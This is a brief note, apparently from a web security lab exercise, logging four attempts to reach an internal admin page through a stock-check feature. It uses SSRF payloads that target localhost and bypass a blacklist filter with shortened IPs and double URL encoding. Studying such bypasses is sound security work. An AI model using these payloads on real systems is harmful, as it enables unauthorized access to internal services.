/*
http://localhost/admin                first trial    _|_
"External stock check blocked for security reasons"

http%3A%2F%2F127.1                    second trial   _|_ _|_
200 OK

http%3A%2F%2F127.1%2Fadmin               third trial   _|_ _|_ _|_
"External stock check blocked for security reasons"

lets obfuscate the 'a' using double encoding
http%3A%2F%2F127.1%2F%25%36%31dmin              fourth trial   _|_ _|_ _|_ _|_

By using double encoding it’s possible to bypass security filters that only decode user input once. 
The second decoding process is executed by the backend platform or modules that properly handle 
encoded data, but don’t have the corresponding security checks in place.



*/